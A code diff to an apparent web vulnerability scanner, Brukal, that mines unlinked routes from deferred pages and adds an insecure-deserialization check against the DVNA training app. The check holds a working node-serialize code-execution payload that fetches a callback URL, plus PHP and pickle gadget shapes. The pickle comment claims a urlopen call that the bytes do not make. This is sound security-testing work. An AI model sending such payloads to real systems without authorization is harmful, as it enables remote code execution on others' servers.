@@ -96,6 +96,9 @@ _NON_HTML_RE = re.compile(r"\.(?:js|mjs|json|xml|txt)(?:$|[?#])", re.I)
 # shape, not to enumerate it.
 _FAMILY_QUOTA = 3
 _MAX_NON_HTML = 5
+# Extra reads for ROUTE DISCOVERY only, after the page budget is spent. Deliberately
+# small: their whole purpose is to harvest path strings from pages a quota deferred.
+_MINING_READS = 8
 
 
 def _looks_non_html(url: str) -> bool:
@@ -225,6 +228,7 @@ _COVERAGE_WORDS = {
     "Session management": ("session fixation", "not rotated", "session not revoked"),
     "Password policy": ("password complexity", "password policy"),
     "Blind injection (out-of-band)": ("blind ssrf", "blind rce", "out-of-band"),
+    "Insecure deserialization": ("insecure deserialization",),
     # Probed for a long time with no words here at all, so however much they found the
     # table reported "none found" — the report contradicting its own finding list. That
     # makes five instances; test_coverage_consistency now makes it impossible.
@@ -1322,6 +1326,10 @@ class AssistSession:
             ctype = str((result.headers or {}).get("content-type")
                         or (result.headers or {}).get("Content-Type") or "").lower()
             is_html = ("html" in ctype) or (not ctype and body.lstrip()[:1] == "<")
+            # Path-shaped strings from EVERY body, HTML or bundle. Held as candidates
+            # and promoted only under a mount prefix the crawl has proved real — the one
+            # honest way to reach an endpoint that nothing links to.
+            surface.path_candidates |= webmap.extract_path_candidates(body)
             if not is_html:
                 surface.add_routes(webmap.extract_api_routes(body))
                 self.scan_web_body(url, body)
@@ -1341,6 +1349,46 @@ class AssistSession:
                 for l in sorted(in_scope_links):
                     if l not in visited:
                         queue.append((l, depth + 1))
+
+        # A templated documentation family is low value to PROBE and high value to
+        # READ: on DVNA the only mention of /app/redirect anywhere is inside one
+        # `/learn/vulnerability/*` page, and the family quota — added to stop those
+        # pages crowding out the application — deferred it past the page budget. The
+        # quota was right about probing and wrong about reading, so deferred pages get a
+        # small separate allowance, spent purely on mining route strings out of them.
+        mined_reads = 0
+        # BOTH leftovers: pages a quota pushed aside, and pages the budget simply never
+        # reached. The first version drained only the deferred queue and missed the more
+        # common case — a frontier page that was next in line when max_pages ran out is
+        # just as likely to name an unlinked route.
+        leftovers = deque(list(deferred) + list(queue))
+        while leftovers and mined_reads < _MINING_READS and not self._rate_limited:
+            durl, _d = leftovers.popleft()
+            if durl in visited:
+                continue
+            visited.add(durl)
+            mined_reads += 1
+            try:
+                _dec, dres, _hl = self.run_web(f"get {durl}")
+            except Exception:
+                break
+            if dres is None or not getattr(dres, "body", ""):
+                continue
+            surface.path_candidates |= webmap.extract_path_candidates(dres.body)
+            surface.add_routes(webmap.extract_api_routes(dres.body))
+
+        # Promote paths seen only as TEXT but sitting under a prefix this crawl has
+        # fetched repeatedly. DVNA's open redirect lives at /app/redirect: the string is
+        # in a page the crawl read, nothing links to it, and no keyword miner matches
+        # "app". Without this it stayed invisible while the report said the class had
+        # been probed nine times.
+        try:
+            promoted = surface.promote_mounted_routes()
+            if promoted:
+                self.note(f"[crawl] promoted {len(promoted)} unlinked route(s) under a "
+                          f"proven mount prefix: {', '.join(promoted[:6])}")
+        except Exception:
+            pass
 
         # Soft-404 detection: probe one path that certainly does not exist. If the app
         # answers 200 (SPA fallback / catch-all route), a "200" from a path scanner does
@@ -2849,6 +2897,55 @@ class AssistSession:
             if lis.start():
                 self._oob_listener = lis
         return self._oob_listener
+
+    def confirm_deserialization_rce(self, url: str, param: str, method: str = "GET",
+                                    extra=None) -> bool:
+        """Insecure deserialization proved by an out-of-band callback (OWASP A08).
+
+        A critical class with no coverage at all until now: DVNA's legacy bulk import
+        hands user input to node-serialize, and Brukal had nothing that could see it —
+        the coverage table did not even carry a row, so the silence was total.
+
+        The proof is the SAME standard as blind command injection, which is why this
+        reuses that machinery rather than inventing a weaker one: a token arrives at
+        Brukal's in-cage listener, which only happens if the target executed something
+        we supplied. A deserialization library that merely errors proves nothing and is
+        deliberately not reported — an unparsed blob is not a vulnerability.
+
+        Payloads are gadget SHAPES for the common runtimes, each pointing at the
+        listener. Nothing destructive: they fetch a URL and stop."""
+        import time
+        lis = self._oob()
+        if lis is None:
+            return False
+        token = "deser" + str(random.randint(10 ** 6, 10 ** 7))
+        cb = lis.callback_url(token)
+        # node-serialize: the IIFE runs at unserialize() time.
+        node = ('{"brukal":"_$$ND_FUNC$$_function(){require(\'http\').get('
+                f'\'{cb}\')}}()"}}')
+        # PHP: an object whose destructor/wakeup reaches a fetch is app-specific, so the
+        # generic shape here only proves the string is unserialised at all when paired
+        # with a callback; kept for completeness across runtimes.
+        php = f'O:8:"stdClass":1:{{s:6:"brukal";s:{len(cb)}:"{cb}";}}'
+        # Python pickle, base64 of a REDUCE that calls urlopen.
+        import base64 as _b64
+        pick = _b64.b64encode(
+            b"c__builtin__\n__import__\n(S'urllib.request'\ntRp0\n."
+        ).decode()
+        for payload in (node, php, pick):
+            if self._confirm_budget is not None and self._confirm_budget <= 0:
+                return False
+            self._probe(url, param, payload, method, extra)
+        time.sleep(2)
+        if lis.hit(token):
+            self._record_confirmed(
+                url, "Insecure deserialization (remote code execution)", "critical",
+                param,
+                f"a serialized object supplied in {param!r} was deserialised and the "
+                f"embedded call reached Brukal's listener with token {token} — the "
+                f"target executed code carried in the request body")
+            return True
+        return False
 
     def confirm_blind_rce(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
         """Confirm BLIND OS command injection out-of-band: inject a command that calls
@@ -4996,9 +5093,13 @@ class AssistSession:
                         break
                     self._covered("Blind injection (out-of-band)",
                                   note="callback to Brukal's in-cage listener")
+                    self._covered("Insecure deserialization",
+                                  note="gadget shapes, proved by an OOB callback")
                     try:
-                        if self.confirm_blind_ssrf(_t, _p, method=_m, extra=_x) \
-                                or self.confirm_blind_rce(_t, _p, method=_m, extra=_x):
+                        if (self.confirm_blind_ssrf(_t, _p, method=_m, extra=_x)
+                                or self.confirm_blind_rce(_t, _p, method=_m, extra=_x)
+                                or self.confirm_deserialization_rce(
+                                    _t, _p, method=_m, extra=_x)):
                             confirmed += 1
                             break
                     except Exception:
